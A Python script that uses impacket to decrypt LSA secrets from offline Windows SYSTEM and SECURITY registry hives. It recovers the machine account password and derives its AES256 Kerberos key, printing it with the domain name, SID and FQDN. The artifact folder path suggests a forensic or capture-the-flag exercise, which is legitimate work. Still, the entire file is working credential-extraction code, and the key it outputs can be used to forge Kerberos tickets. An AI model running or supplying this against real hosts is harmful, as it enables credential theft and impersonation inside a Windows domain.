from impacket.examples.secretsdump import LSASecrets, LocalOperations, LSA_SECRET, LSA_SECRET_BLOB
from impacket.ldap.ldaptypes import LDAP_SID
from impacket.krb5.crypto import string_to_key
from impacket.krb5 import constants

def unicode_str_decode(unicode_str):
    return unicode_str[8:-2].decode('utf-16-le')

local_operations = LocalOperations(f"./artifacts/factws-registry/system")
boot_key = local_operations.getBootKey()

secrets = LSASecrets(f"./artifacts/factws-registry/security", boot_key)
secrets._LSASecrets__getLSASecretKey() # __getLSASecretKey() is a private method, so we need to call it directly
key = secrets._LSASecrets__LSAKey

machine_name = unicode_str_decode(secrets.getValue("Policy\\PolAcDmN\\")[1])
domain = unicode_str_decode(secrets.getValue("Policy\\PolPrDmN\\")[1])
domain_sid = LDAP_SID(secrets.getValue("Policy\\PolPrDmS\\")[1]).formatCanonical()
fqdn = unicode_str_decode(secrets.getValue("Policy\\PolDnDDN\\")[1])

enc_machine_password = secrets.getValue("Policy\\Secrets\\$MACHINE.ACC\\CurrVal\\default")[1]

record = LSA_SECRET(enc_machine_password)
tmpKey = secrets._LSASecrets__sha256(key, record['EncryptedData'][:32])
plainText = secrets._LSASecrets__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
record = LSA_SECRET_BLOB(plainText)
machine_password = record['Secret']

salt = '%shost%s.%s' % (fqdn.upper(), machine_name.lower(), fqdn.lower())
fixedPassword = machine_password.decode('utf-16-le', 'replace').encode('utf-8', 'replace')
key = string_to_key(int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), fixedPassword, salt.encode())
key = key.contents.hex()

print(f"Machine Name: {machine_name}")
print(f"Domain: {domain}")
print(f"Domain SID: {domain_sid}")
print(f"FQDN: {fqdn}")
print(f"AES256 Key: {key}")
